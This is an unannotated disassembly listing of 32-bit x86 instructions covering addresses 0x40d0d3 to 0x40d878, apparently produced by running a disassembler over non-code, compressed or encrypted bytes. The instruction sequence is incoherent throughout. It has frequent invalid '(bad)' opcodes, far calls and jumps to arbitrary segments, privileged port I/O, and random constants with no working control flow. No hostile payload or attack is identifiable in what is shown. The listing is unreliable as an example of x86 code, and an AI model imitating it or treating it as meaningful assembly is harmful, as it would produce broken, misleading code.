  40d0d3:	ret    
  40d0d4:	push   eax
  40d0d5:	ret    0xbea3
  40d0d8:	(bad)  
  40d0d9:	call   0x5fd0:0x97249a08
  40d0e0:	inc    ecx
  40d0e1:	sub    dh,BYTE PTR [edx]
  40d0e3:	mov    edx,DWORD PTR [esi]
  40d0e5:	adc    ebp,DWORD PTR [edx-0x32dd2037]
  40d0eb:	nop
  40d0ec:	jl     0x40d127
  40d0ee:	add    DWORD PTR [esi],ebp
  40d0f0:	ins    BYTE PTR es:[edi],dx
  40d0f1:	imul   edi,ebx,0x12f4cb42
  40d0f7:	push   edx
  40d0f8:	out    dx,eax
  40d0f9:	add    DWORD PTR [ebp-0x1b7e9bda],esp
  40d0ff:	or     esp,ebx
  40d101:	mov    edi,0xd0f03c1a
  40d106:	ret    0x936
  40d109:	add    eax,0x5c4eb226
  40d10e:	sti    
  40d10f:	repnz dec esi
  40d111:	(bad)  
  40d112:	push   esp
  40d113:	mov    cl,0xeb
  40d115:	aas    
  40d116:	sub    eax,0xbad3a9c4
  40d11b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d11c:	push   cs
  40d11d:	xor    cl,BYTE PTR [ebp+0x7e]
  40d120:	add    eax,0x262b0877
  40d125:	pop    ss
  40d126:	aam    0xf6
  40d128:	sub    ebp,0x27
  40d12b:	test   al,0xd2
  40d12d:	clc    
  40d12e:	sub    ebx,DWORD PTR [ebp-0x61fecfa8]
  40d134:	mov    al,ds:0xed03ba66
  40d139:	push   ebp
  40d13a:	inc    eax
  40d13b:	pusha  
  40d13c:	mov    edx,0xc02c8389
  40d141:	pop    ebp
  40d142:	fmul   st(4),st
  40d144:	in     al,0xa1
  40d146:	inc    edi
  40d147:	inc    esp
  40d148:	or     edi,DWORD PTR [edi]
  40d14a:	push   0x1b
  40d14c:	or     eax,0x4ef75433
  40d151:	imul   edi,DWORD PTR [ebx+0x20],0x628d5abb
  40d158:	arpl   WORD PTR [esi],cx
  40d15a:	out    dx,eax
  40d15b:	adc    DWORD PTR [edx+0x69c16b0],0xffffffd5
  40d162:	mov    bl,0x62
  40d164:	loope  0x40d1b2
  40d166:	mov    al,bl
  40d168:	pop    ebp
  40d169:	movsx  esi,WORD PTR [eax-0x7e]
  40d16d:	ja     0x40d1d9
  40d16f:	clc    
  40d170:	aam    0xec
  40d172:	adc    eax,0x878c640d
  40d177:	mov    bh,0x51
  40d179:	mov    ecx,0x6249bcdc
  40d17e:	sti    
  40d17f:	gs inc ebp
  40d181:	mov    al,ds:0xa57b3ba2
  40d186:	lock in eax,0xa7
  40d189:	mov    dh,0x76
  40d18b:	cli    
  40d18c:	(bad)  
  40d18d:	sub    eax,0x270a3043
  40d192:	es jbe 0x40d1de
  40d195:	fnstenv [ecx+0x25d5d7a9]
  40d19b:	add    BYTE PTR [ebx+ecx*4-0x59baf653],dl
  40d1a2:	(bad)  
  40d1a3:	clc    
  40d1a4:	cmp    al,0x63
  40d1a6:	aad    0xa
  40d1a8:	add    eax,0x6024c9c4
  40d1ad:	lods   al,BYTE PTR ds:[esi]
  40d1ae:	and    al,0x7a
  40d1b0:	sbb    eax,0xc4332511
  40d1b5:	xor    al,0x69
  40d1b7:	mov    ecx,0x52f01e7e
  40d1bc:	popa   
  40d1bd:	and    ecx,esi
  40d1bf:	fwait
  40d1c0:	sar    DWORD PTR [ecx+0x76bdc492],1
  40d1c6:	adc    eax,0xcca45db6
  40d1cb:	outs   dx,BYTE PTR ds:[esi]
  40d1cc:	xor    al,0x84
  40d1ce:	std    
  40d1cf:	enter  0x830,0x5
  40d1d3:	hlt    
  40d1d4:	in     eax,dx
  40d1d5:	add    dh,BYTE PTR [ebx+0x6cbbefef]
  40d1db:	cmp    DWORD PTR [ebx+0x3ee6a047],esp
  40d1e1:	add    al,0x4
  40d1e3:	dec    ecx
  40d1e4:	cwde   
  40d1e5:	ret    0xcbb0
  40d1e8:	loop   0x40d194
  40d1ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1eb:	ja     0x40d1f8
  40d1ed:	clc    
  40d1ee:	ds dec ebp
  40d1f0:	leave  
  40d1f1:	cmp    BYTE PTR [edx-0x5e],dh
  40d1f4:	loope  0x40d1c4
  40d1f6:	adc    BYTE PTR [edx+0x71],dl
  40d1f9:	shl    BYTE PTR [edx],0x84
  40d1fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1fd:	jecxz  0x40d25a
  40d1ff:	retf   
  40d200:	stos   DWORD PTR es:[edi],eax
  40d201:	mov    edx,fs
  40d203:	push   ebx
  40d204:	ficomp DWORD PTR [esi+0x30]
  40d207:	push   0xffffffae
  40d209:	push   eax
  40d20a:	mov    DWORD PTR [ebp-0x59762f47],edx
  40d210:	sahf   
  40d211:	adc    esp,0xffffffb4
  40d214:	enter  0x80,0x8c
  40d218:	fistp  DWORD PTR [ebx+0x704c6068]
  40d21e:	fnop   
  40d220:	lahf   
  40d221:	lea    esp,[edi-0x624989e9]
  40d227:	into   
  40d228:	inc    ecx
  40d229:	gs xchg ebp,eax
  40d22b:	(bad)
  40d230:	outs   dx,DWORD PTR ds:[esi]
  40d231:	es out dx,eax
  40d233:	xor    BYTE PTR [esi],0x46
  40d236:	leave  
  40d237:	adc    ch,BYTE PTR [ebx+0x3b]
  40d23a:	pop    esp
  40d23b:	mov    eax,DWORD PTR [ebx]
  40d23d:	mov    edi,0xe532a207
  40d242:	leave  
  40d243:	mul    esp
  40d245:	cmp    al,0xfd
  40d247:	push   0xbab8ea88
  40d24c:	dec    edx
  40d24d:	mov    BYTE PTR [bx+si-0x4b7f],cl
  40d252:	jl     0x40d248
  40d254:	and    eax,0xb5f6ff95
  40d259:	jp     0x40d291
  40d25b:	dec    ecx
  40d25c:	clc    
  40d25d:	mov    DWORD PTR [esp+0x7ea81c67],edi
  40d264:	pop    ebp
  40d265:	inc    eax
  40d266:	enter  0x2583,0x26
  40d26a:	xchg   edx,eax
  40d26b:	mov    al,0x3
  40d26d:	cmp    DWORD PTR [eax],ebp
  40d26f:	shl    DWORD PTR [edi+0x60],1
  40d272:	mov    edi,DWORD PTR [ebp-0x7f3c2196]
  40d278:	cmc    
  40d279:	cmc    
  40d27a:	adc    ebx,DWORD PTR [edx+0x16]
  40d27d:	push   es
  40d27e:	xor    eax,0x258454c8
  40d283:	iret   
  40d284:	cld    
  40d285:	dec    edi
  40d286:	lods   al,BYTE PTR ds:[esi]
  40d287:	adc    eax,0x1cf7acee
  40d28c:	out    dx,eax
  40d28d:	sub    DWORD PTR [eax],esp
  40d28f:	push   edx
  40d290:	call   0x19c5:0x92c6b3a7
  40d297:	dec    esi
  40d298:	add    BYTE PTR [ecx-0x1f4f1549],dl
  40d29e:	add    eax,DWORD PTR [esi-0x65bd8cc]
  40d2a4:	scas   eax,DWORD PTR es:[edi]
  40d2a5:	adc    DWORD PTR [ebx+0x4],0x20
  40d2a9:	out    0x72,eax
  40d2ab:	stc    
  40d2ac:	mov    ds:0x9dc4929b,al
  40d2b1:	sub    eax,DWORD PTR [esi-0x424d3ff5]
  40d2b7:	mul    ch
  40d2b9:	sub    esi,DWORD PTR [eax+ebx*8]
  40d2bc:	(bad)  
  40d2be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2bf:	out    0x61,al
  40d2c1:	rcr    eax,1
  40d2c3:	call   0x402ce465
  40d2c8:	mov    DWORD PTR cs:[esi-0x8f37ac3],ecx
  40d2cf:	sub    BYTE PTR [esi-0x1e],bl
  40d2d2:	lds    edx,FWORD PTR [esi]
  40d2d4:	int    0x4c
  40d2d6:	mov    ah,0xc7
  40d2d8:	inc    esi
  40d2d9:	inc    edx
  40d2da:	or     BYTE PTR [ebx-0x5af78450],dh
  40d2e0:	pop    ds
  40d2e1:	sub    ch,BYTE PTR [ebx+edx*8]
  40d2e4:	mov    dh,0x49
  40d2e6:	je     0x40d2a5
  40d2e8:	and    cl,bh
  40d2ea:	xchg   DWORD PTR [eax-0x62c864],ecx
  40d2f0:	(bad)  
  40d2f1:	(bad)  
  40d2f2:	xlat   BYTE PTR ds:[ebx]
  40d2f3:	xor    esi,DWORD PTR [esp+edi*8-0x71]
  40d2f7:	les    edx,FWORD PTR [ebp+0x4ac86c7]
  40d2fd:	in     eax,0xef
  40d2ff:	dec    ebx
  40d300:	xor    al,0x90
  40d302:	scas   al,BYTE PTR es:[edi]
  40d303:	test   eax,0xacc93d3d
  40d308:	xor    DWORD PTR [edi-0x3e0cc655],ebp
  40d30e:	or     bh,BYTE PTR [esi+0x50]
  40d311:	aaa    
  40d312:	retf   0xbc88
  40d315:	iret   
  40d316:	xor    dl,BYTE PTR [ebp+edx*1-0x3a8da17e]
  40d31d:	neg    BYTE PTR [ebx-0x34]
  40d320:	push   ebx
  40d321:	cmp    al,0x81
  40d323:	mov    ah,BYTE PTR [ebp+0x9]
  40d326:	neg    ch
  40d328:	push   ds
  40d329:	test   DWORD PTR [esi+edx*8],esi
  40d32c:	ins    DWORD PTR es:[edi],dx
  40d32d:	add    BYTE PTR [esp+edi*4-0x7109298d],cl
  40d334:	add    dh,dh
  40d336:	test   eax,eax
  40d338:	not    BYTE PTR [edi+0x35]
  40d33b:	xlat   BYTE PTR ds:[ebx]
  40d33c:	push   esp
  40d33d:	mov    ds:0x4ff1f9cf,eax
  40d342:	cmp    dl,BYTE PTR [esi-0x4f24f697]
  40d348:	idiv   DWORD PTR [edi]
  40d34a:	mov    bh,0xb7
  40d34c:	xor    eax,DWORD PTR [eax+ebx*2-0x78873bca]
  40d353:	mov    eax,0xc0decbe1
  40d358:	ins    DWORD PTR es:[edi],dx
  40d359:	push   ds
  40d35a:	adc    dl,bh
  40d35c:	ds inc ebp
  40d35e:	adc    edx,esp
  40d360:	jge    0x40d3a2
  40d362:	cmc    
  40d363:	loope  0x40d315
  40d365:	cmpxchg DWORD PTR [ecx-0x4fb0996a],edx
  40d36c:	add    cl,bl
  40d36e:	add    esi,DWORD PTR [ecx]
  40d370:	mov    ah,cl
  40d372:	dec    edi
  40d373:	stos   BYTE PTR es:[edi],al
  40d374:	ja     0x40d35c
  40d376:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d377:	push   cs
  40d378:	jbe    0x40d370
  40d37a:	mov    esp,0xade4a52e
  40d37f:	mov    bl,BYTE PTR [eax+0x217f35bd]
  40d385:	dec    si
  40d387:	push   es
  40d388:	inc    esi
  40d389:	je     0x40d349
  40d38b:	scas   al,BYTE PTR es:[edi]
  40d38c:	mov    ebx,0xccf31b03
  40d391:	lods   al,BYTE PTR ds:[esi]
  40d392:	xor    eax,0x22557a2e
  40d397:	adc    esi,ebx
  40d399:	stc    
  40d39a:	in     al,dx
  40d39b:	ins    BYTE PTR es:[edi],dx
  40d39c:	pop    esp
  40d39d:	fwait
  40d39e:	or     esp,ebx
  40d3a0:	(bad)  
  40d3a1:	icebp  
  40d3a2:	pop    edi
  40d3a3:	inc    ebx
  40d3a4:	ds ret 
  40d3a6:	fs (bad) 
  40d3a8:	std    
  40d3a9:	cmc    
  40d3aa:	enter  0x2978,0xb0
  40d3ae:	xchg   esp,eax
  40d3af:	loopne 0x40d41d
  40d3b1:	test   DWORD PTR [esi],esi
  40d3b3:	in     eax,dx
  40d3b4:	les    edi,FWORD PTR [ecx]
  40d3b6:	loopne 0x40d381
  40d3b8:	sub    ch,BYTE PTR [edi]
  40d3ba:	push   esi
  40d3bb:	repz pop es
  40d3bd:	push   ebx
  40d3be:	enter  0xcbd1,0xf5
  40d3c2:	test   eax,0x4e8621e3
  40d3c7:	jne    0x40d383
  40d3c9:	call   0x4ce:0x5c4e478d
  40d3d0:	mov    bh,0xf6
  40d3d2:	inc    esp
  40d3d3:	cmp    eax,0xcc4074aa
  40d3d8:	xchg   ebx,eax
  40d3d9:	push   esp
  40d3da:	adc    BYTE PTR [ebx],bl
  40d3dc:	lahf   
  40d3dd:	mov    bl,0xb2
  40d3df:	lods   al,BYTE PTR ds:[esi]
  40d3e0:	mov    ecx,0x44e6abc9
  40d3e5:	mov    ecx,0x5044910f
  40d3ea:	jl     0x40d389
  40d3ec:	xor    al,0x7b
  40d3ee:	push   ss
  40d3ef:	lahf   
  40d3f0:	push   ss
  40d3f1:	enter  0xc25e,0x54
  40d3f5:	retf   
  40d3f6:	test   BYTE PTR [eax+0x78],0x47
  40d3fa:	push   esi
  40d3fb:	cwde   
  40d3fc:	sub    al,0xf2
  40d3fe:	in     al,dx
  40d3ff:	mov    edi,0x172cf858
  40d404:	mov    ecx,0xa75c889f
  40d409:	stos   DWORD PTR es:[edi],eax
  40d40a:	std    
  40d40b:	or     eax,0x3e2044a6
  40d410:	(bad)
  40d414:	dec    eax
  40d415:	mov    ecx,0xb9f825fb
  40d41a:	pusha  
  40d41b:	jbe    0x40d474
  40d41d:	dec    eax
  40d41e:	fucom  st(0)
  40d420:	nop
  40d421:	mov    ebx,0x64f69493
  40d426:	adc    esp,edx
  40d428:	retf   
  40d429:	iret   
  40d42a:	sbb    al,0x9c
  40d42c:	mov    ah,0x92
  40d42e:	arpl   WORD PTR [ecx-0x47],si
  40d431:	in     eax,dx
  40d432:	push   esp
  40d433:	mov    ch,0x22
  40d435:	mov    al,ds:0xe052e85c
  40d43a:	fwait
  40d43b:	ret    0xa04c
  40d43e:	cmp    ebp,0xab2fa9af
  40d444:	push   eax
  40d445:	ds mov cl,0xbc
  40d448:	mov    ch,0x76
  40d44a:	sub    eax,0x5a667d46
  40d44f:	mov    eax,0xff522da4
  40d454:	xor    ch,BYTE PTR [edx-0x285b1926]
  40d45a:	push   es
  40d45b:	sub    edi,DWORD PTR [ebp+0x39]
  40d45e:	and    eax,0x864e137d
  40d463:	leave  
  40d464:	jl     0x40d410
  40d466:	nop
  40d467:	hlt    
  40d468:	push   esi
  40d469:	xchg   esp,eax
  40d46a:	fistp  QWORD PTR [ecx-0x7f]
  40d46d:	fsubr  QWORD PTR [edx]
  40d46f:	scas   al,BYTE PTR es:[edi]
  40d470:	push   ebp
  40d471:	jge    0x40d451
  40d473:	mov    al,ds:0x54151daa
  40d478:	dec    ecx
  40d479:	in     al,0x15
  40d47b:	jge    0x40d4e4
  40d47d:	shl    DWORD PTR [edx-0x55],0xfd
  40d481:	test   ch,cl
  40d483:	loope  0x40d42b
  40d485:	and    BYTE PTR [ecx+0x5aa7fdaf],bl
  40d48b:	sete   BYTE PTR [esi]
  40d48e:	in     al,0x13
  40d490:	enter  0x3234,0x5f
  40d494:	push   edi
  40d495:	sub    dh,BYTE PTR [ebx+0x55]
  40d498:	dec    ebp
  40d499:	fnstenv [eax+ecx*8-0x7e1568af]
  40d4a0:	push   ebx
  40d4a1:	das    
  40d4a2:	loope  0x40d492
  40d4a4:	xchg   BYTE PTR [edi-0x6d08ee2b],ch
  40d4aa:	push   ebp
  40d4ab:	sbb    BYTE PTR [esi],al
  40d4ad:	jmp    0x4a34:0x6ee61d7b
  40d4b4:	xor    al,0x11
  40d4b6:	sub    al,0x47
  40d4b8:	rcr    dh,0x20
  40d4bb:	cld    
  40d4bc:	hlt    
  40d4bd:	add    eax,0xd00e471
  40d4c2:	cwde   
  40d4c3:	jns    0x40d4ed
  40d4c5:	jno    0x40d4f1
  40d4c7:	inc    edi
  40d4c8:	cmp    eax,esp
  40d4ca:	rol    dh,cl
  40d4cc:	addr16 inc eax
  40d4ce:	pop    ecx
  40d4cf:	int3   
  40d4d0:	sub    esp,ecx
  40d4d2:	add    al,0x2b
  40d4d4:	dec    edi
  40d4d5:	rcr    BYTE PTR [ecx+0x5f],0xc9
  40d4d9:	adc    eax,0xbebacaa
  40d4de:	push   esi
  40d4df:	cmp    eax,DWORD PTR [edx+esi*1-0x7e]
  40d4e3:	(bad)  
  40d4e5:	mov    WORD PTR [ecx],es
  40d4e7:	push   esp
  40d4e8:	pop    ds
  40d4e9:	ficomp DWORD PTR [ebx]
  40d4eb:	add    ebx,0x6b
  40d4ee:	lds    esp,FWORD PTR [edi]
  40d4f0:	push   es
  40d4f1:	and    DWORD PTR [eax+0x4a],ebp
  40d4f4:	and    BYTE PTR [edi],bh
  40d4f6:	fistp  QWORD PTR [eax+0x6d]
  40d4f9:	int    0xd8
  40d4fb:	out    dx,eax
  40d4fc:	or     al,0x15
  40d4fe:	mov    eax,ds:0xe77b9009
  40d503:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d504:	and    al,0x9f
  40d506:	daa    
  40d507:	mov    edi,0xab337289
  40d50c:	xchg   esp,eax
  40d50d:	sbb    eax,0xb3ee0938
  40d512:	mov    esp,0x1a38f844
  40d517:	jecxz  0x40d4e9
  40d519:	sbb    BYTE PTR [ecx],dl
  40d51b:	xchg   edi,eax
  40d51c:	adc    ah,dh
  40d51e:	ss dec esi
  40d520:	leave  
  40d521:	sbb    ebp,ecx
  40d523:	das    
  40d524:	and    DWORD PTR [edx+0x5d7fc9ad],ecx
  40d52a:	jnp    0x40d4f6
  40d52c:	clc    
  40d52d:	push   ebx
  40d52e:	sub    eax,0x931ab9a2
  40d533:	cwde   
  40d534:	cmp    dl,BYTE PTR [ebp-0x4c]
  40d537:	sub    al,0xcd
  40d539:	mov    bh,0x9d
  40d53b:	(bad)  
  40d53c:	and    al,0xb1
  40d53e:	vaddps xmm7,xmm6,xmm5
  40d542:	xchg   edx,eax
  40d543:	mul    DWORD PTR [eiz*4+0x2b8c8b73]
  40d54a:	mov    BYTE PTR [ebx+0x32],al
  40d54d:	jne    0x40d5cb
  40d54f:	out    0x2a,al
  40d551:	scas   eax,DWORD PTR es:[edi]
  40d552:	fsubp  st(4),st
  40d554:	adc    al,0xdc
  40d556:	push   eax
  40d557:	retf   
  40d558:	jecxz  0x40d5bc
  40d55a:	ret    
  40d55b:	add    esi,edi
  40d55d:	adc    bl,BYTE PTR [ecx]
  40d55f:	mov    edx,0x658d6ed8
  40d564:	inc    ebx
  40d565:	mov    dl,0xb8
  40d567:	fisubr DWORD PTR [edi-0x7151f1c]
  40d56d:	xor    BYTE PTR [eax],al
  40d56f:	imul   edx,ecx,0x9583f427
  40d575:	imul   ecx,DWORD PTR [ecx+edx*8],0x9948b75
  40d57c:	jo     0x40d5e7
  40d57e:	mov    dl,0xe3
  40d580:	xchg   ecx,eax
  40d581:	pop    eax
  40d582:	icebp  
  40d583:	xor    eax,0x4c5b9986
  40d588:	jno    0x40d555
  40d58a:	jl     0x40d5fa
  40d58c:	sub    DWORD PTR [edi],edx
  40d58e:	jmp    0x10653e61
  40d593:	mov    ebp,0xf04501bd
  40d598:	and    BYTE PTR [esp+ecx*4],0x45
  40d59c:	jmp    0x40d611
  40d59e:	cmp    BYTE PTR [edx],dl
  40d5a0:	push   ds
  40d5a1:	mov    ebp,0x783ac934
  40d5a6:	dec    ebp
  40d5a7:	xor    BYTE PTR [esi],ch
  40d5a9:	xchg   esp,eax
  40d5aa:	test   DWORD PTR [ecx-0x54],esi
  40d5ad:	sar    DWORD PTR [edx],cl
  40d5af:	fdivr  DWORD PTR [ecx]
  40d5b1:	rcl    DWORD PTR [esp+esi*4],cl
  40d5b4:	or     BYTE PTR [edi+0x55],ah
  40d5b7:	mov    ebp,0xb4198e16
  40d5bc:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5be:	test   eax,0x35b6ec8c
  40d5c3:	xor    DWORD PTR [edi+0x2114cc9],0xffffff85
  40d5ca:	and    al,0xbb
  40d5cc:	add    DWORD PTR [edi*4-0x5f59b46],esp
  40d5d3:	or     DWORD PTR [esi],edx
  40d5d5:	cmc    
  40d5d6:	fstp   QWORD PTR ds:0xe2c60c4c
  40d5dc:	in     eax,0xfb
  40d5de:	outs   dx,BYTE PTR es:[esi]
  40d5e0:	shl    BYTE PTR [ecx],0x69
  40d5e3:	inc    ebx
  40d5e4:	mov    ebx,0x22416092
  40d5e9:	into   
  40d5ea:	test   DWORD PTR [ebx-0x56],esp
  40d5ed:	mov    ebp,fs
  40d5ef:	nop
  40d5f0:	or     al,0x9c
  40d5f2:	imul   edx,DWORD PTR [ebx+edi*1],0xffffffea
  40d5f6:	lods   eax,DWORD PTR ds:[esi]
  40d5f7:	ror    DWORD PTR [ebx+0x5802db6],cl
  40d5fd:	mov    edx,edi
  40d5ff:	cmp    DWORD PTR [edx-0x4e],0x21
  40d603:	arpl   WORD PTR [esi+0x5f4ce0e2],sp
  40d609:	sar    eax,1
  40d60b:	sub    ebp,esi
  40d60d:	int    0x94
  40d60f:	mov    bh,0x5d
  40d611:	adc    ah,BYTE PTR ds:0x70c9b5b6
  40d617:	sahf   
  40d618:	mov    al,ds:0xa4617390
  40d61d:	mov    DWORD PTR [ebx],esp
  40d61f:	pusha  
  40d620:	popf   
  40d621:	pop    ebp
  40d622:	bound  ecx,QWORD PTR [eax]
  40d624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d625:	test   BYTE PTR [ebx+0x50],0xde
  40d629:	xor    eax,0x9305bb6f
  40d62e:	sub    BYTE PTR [edi-0x3849baf4],0xee
  40d635:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d636:	cmp    al,0xd5
  40d638:	nop
  40d639:	fild   DWORD PTR [esi]
  40d63b:	mov    ecx,DWORD PTR [ebx]
  40d63d:	sbb    ebp,DWORD PTR es:0x34dff16c
  40d644:	out    dx,al
  40d645:	iret   
  40d646:	and    DWORD PTR [ecx+0x1c],esi
  40d649:	nop
  40d64a:	inc    ebx
  40d64c:	sbb    bh,BYTE PTR [ecx+0x74]
  40d64f:	dec    ecx
  40d650:	imul   bl
  40d652:	cmp    eax,0x24a75a62
  40d657:	leave  
  40d658:	sbb    eax,0x5e0a6e4f
  40d65d:	gs js  0x40d6b9
  40d660:	repnz pop esi
  40d662:	mov    ebp,0x21839921
  40d667:	jo     0x40d621
  40d669:	retf   0x3958
  40d66c:	xchg   DWORD PTR [ebx+0x56f30f07],edx
  40d672:	and    al,0x57
  40d674:	xor    BYTE PTR [edx+0x1b],bh
  40d677:	mov    dh,al
  40d679:	and    BYTE PTR [eax+0x1a8c92b],dh
  40d67f:	bound  ebx,QWORD PTR [ebx-0x4]
  40d682:	mov    fs,esp
  40d684:	or     ebp,edx
  40d686:	es mov dl,0x42
  40d689:	in     al,dx
  40d68a:	inc    esp
  40d68b:	xor    cl,BYTE PTR [ecx+0x2483955b]
  40d691:	add    DWORD PTR ds:0x9d7a863b,ecx
  40d697:	mov    bl,0xd9
  40d699:	imul   ebx,DWORD PTR fs:[edi+esi*8],0xffffffeb
  40d69e:	lock loope 0x40d6e1
  40d6a1:	jp     0x40d67e
  40d6a3:	icebp  
  40d6a4:	push   ebx
  40d6a5:	loopne 0x40d6f3
  40d6a7:	mov    cl,0x2
  40d6aa:	xor    eax,0xa668f09a
  40d6af:	adc    ecx,DWORD PTR [ebx]
  40d6b1:	cmp    al,0x90
  40d6b3:	imul   ebx,DWORD PTR [ebp-0x4b30f180],0xfffffff9
  40d6ba:	scas   al,BYTE PTR es:[edi]
  40d6bb:	ficomp WORD PTR [edi-0x68d1e1dc]
  40d6c1:	push   ecx
  40d6c2:	pop    edx
  40d6c3:	push   ebx
  40d6c4:	ficomp WORD PTR [ecx+0xc]
  40d6c7:	inc    ebx
  40d6c8:	jg     0x40d706
  40d6ca:	jbe    0x40d6f4
  40d6cc:	sub    BYTE PTR [edi-0x2b],cl
  40d6cf:	(bad)  
  40d6d0:	or     eax,0x47f3b4d2
  40d6d5:	int    0xf5
  40d6d7:	mov    al,ds:0x5831a959
  40d6dc:	mov    dl,0x9a
  40d6de:	add    al,0x5
  40d6e0:	mov    ebx,0xdc067deb
  40d6e5:	aad    0xcb
  40d6e7:	sbb    DWORD PTR [ebx+0x30978d3a],esi
  40d6ed:	mov    eax,0x2607a0b4
  40d6f2:	pop    ecx
  40d6f3:	fwait
  40d6f4:	inc    edi
  40d6f5:	pop    edx
  40d6f6:	je     0x40d743
  40d6f8:	add    bl,BYTE PTR [edx]
  40d6fa:	or     DWORD PTR [esp+eiz*4+0x14b418d],ebp
  40d701:	dec    esi
  40d702:	out    dx,al
  40d703:	clc    
  40d704:	jbe    0x40d775
  40d706:	lds    edx,FWORD PTR [eax-0x2d7de487]
  40d70c:	mov    edx,0xf859515d
  40d711:	pop    ss
  40d712:	xchg   esp,eax
  40d713:	jp     0x40d6eb
  40d715:	inc    edi
  40d716:	(bad)  
  40d717:	in     eax,dx
  40d718:	add    BYTE PTR [ebx+0x79ccd5ad],bh
  40d71e:	fsubrp st(7),st
  40d720:	or     DWORD PTR [eax],ebp
  40d722:	dec    eax
  40d723:	mov    ebx,0x833aa44
  40d728:	adc    bh,BYTE PTR [esi]
  40d72a:	cld    
  40d72b:	rcl    BYTE PTR cs:[ebx-0x41],1
  40d72f:	mov    ss,ebx
  40d731:	loop   0x40d76f
  40d733:	mov    dl,0xc5
  40d735:	je     0x40d72b
  40d737:	sbb    esp,esp
  40d739:	or     esp,DWORD PTR [eax+0x2c]
  40d73c:	(bad)  
  40d73d:	cmp    DWORD PTR [eax-0x77774fa2],edi
  40d743:	sub    dl,BYTE PTR [ebp-0x3ecc324f]
  40d749:	cmp    al,0x32
  40d74b:	call   0x41a4ed1b
  40d750:	(bad)  
  40d752:	add    ebp,0xffffff8f
  40d755:	stos   BYTE PTR es:[edi],al
  40d756:	xor    eax,eax
  40d758:	jne    0x40d72e
  40d75a:	mov    DWORD PTR [edi],ebx
  40d75c:	dec    DWORD PTR [ebp+0x4669aec0]
  40d762:	sub    esi,DWORD PTR [edx-0x3770d954]
  40d768:	mov    bh,0xe
  40d76a:	mov    dl,0x38
  40d76c:	cld    
  40d76d:	cli    
  40d76e:	iret   
  40d76f:	pop    ebp
  40d770:	or     edx,DWORD PTR [edx+ecx*4]
  40d773:	movlps QWORD PTR [edi],xmm1
  40d776:	jmp    0x25966dc8
  40d77b:	jmp    0x226f:0x9ae337c3
  40d782:	icebp  
  40d783:	and    ch,al
  40d785:	fmul   st,st(4)
  40d787:	pop    edx
  40d788:	inc    eax
  40d789:	dec    ebx
  40d78a:	fsubr  DWORD PTR [edi]
  40d78c:	jae    0x40d7e5
  40d78e:	inc    DWORD PTR [eax-0x35]
  40d791:	lds    ebx,FWORD PTR [edx+0x6c]
  40d794:	jmp    0x40d771
  40d796:	sub    DWORD PTR ds:0x9cd18d51,edx
  40d79c:	icebp  
  40d79d:	add    BYTE PTR [ebx],bl
  40d79f:	mov    ds:0xfb2382c6,al
  40d7a4:	dec    ebx
  40d7a5:	push   es
  40d7a6:	shr    ebx,0x77
  40d7a9:	js     0x40d73f
  40d7ab:	int    0xdf
  40d7ad:	and    BYTE PTR [esi-0x4c],bl
  40d7b0:	mov    esi,0x6fb2bb56
  40d7b5:	xor    ebx,esp
  40d7b7:	int    0xf7
  40d7b9:	int    0x61
  40d7bb:	jo     0x40d7ea
  40d7bd:	mov    esp,0x29ca9d0
  40d7c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7c3:	int    0x72
  40d7c5:	test   al,0xc6
  40d7c7:	push   edx
  40d7c8:	sbb    eax,0x12a77ddf
  40d7cd:	cmp    eax,0xa425f2db
  40d7d2:	sub    al,0xb
  40d7d4:	push   es
  40d7d5:	mov    eax,ds:0x558eb966
  40d7da:	or     eax,DWORD PTR [esi+0x173dcbb7]
  40d7e0:	jmp    0x40d844
  40d7e2:	pop    edx
  40d7e3:	xchg   esi,eax
  40d7e4:	cli    
  40d7e5:	daa    
  40d7e6:	iret   
  40d7e7:	fs mov bh,0x93
  40d7ea:	and    cl,BYTE PTR ds:0xbc8f4a54
  40d7f0:	xor    DWORD PTR [edx],esp
  40d7f2:	push   edx
  40d7f3:	push   eax
  40d7f4:	lock jae 0x40d7fd
  40d7f7:	loope  0x40d7bb
  40d7f9:	(bad)  
  40d7fa:	ror    bh,cl
  40d7fc:	aaa    
  40d7fd:	add    ebp,esi
  40d7ff:	push   ebp
  40d800:	in     al,0x1b
  40d802:	sbb    dh,BYTE PTR [eax]
  40d804:	push   esi
  40d805:	cmc    
  40d806:	or     al,0x39
  40d808:	dec    ebp
  40d809:	mov    bl,0x76
  40d80b:	test   bh,bh
  40d80d:	repnz out 0xc4,al
  40d810:	xor    ch,BYTE PTR [esp+eax*2-0x5ad2f58f]
  40d817:	inc    esp
  40d818:	mov    ecx,0x6324ed02
  40d81d:	inc    ecx
  40d81e:	in     al,dx
  40d81f:	mov    esi,DWORD PTR ds:0xf2b4b96d
  40d825:	sbb    BYTE PTR [ecx],bl
  40d827:	adc    ah,bh
  40d829:	cmp    esi,DWORD PTR [ecx-0x3bc7da32]
  40d82f:	iret   
  40d830:	addr16 add eax,0xb0fd1bb2
  40d836:	test   DWORD PTR [edx],0xc8818e14
  40d83c:	in     eax,0xbc
  40d83e:	setl   BYTE PTR [esi+0x7c]
  40d842:	mov    cs,WORD PTR [edi]
  40d844:	ror    DWORD PTR [esi+0x50a79c29],1
  40d84a:	or     ah,bh
  40d84c:	inc    edx
  40d84d:	retf   
  40d84e:	sub    eax,DWORD PTR [edx]
  40d850:	outs   dx,BYTE PTR ds:[esi]
  40d851:	(bad)  
  40d852:	(bad)  
  40d853:	adc    eax,0x1b2c0d0
  40d858:	add    al,0x9b
  40d85a:	hlt    
  40d85b:	aas    
  40d85c:	and    DWORD PTR [ebx-0x5c6be975],0x66b060dc
  40d866:	dec    eax
  40d867:	daa    
  40d868:	mov    ds:0xca1d3160,al
  40d86d:	bound  esp,QWORD PTR [edi]
  40d86f:	(bad)  
  40d870:	dec    edx
  40d871:	int3   
  40d872:	out    dx,eax
  40d873:	xchg   esi,eax
  40d874:	loopne 0x40d835
  40d876:	(bad)  
  40d877:	dec    ebx
  40d878:	pop    ss
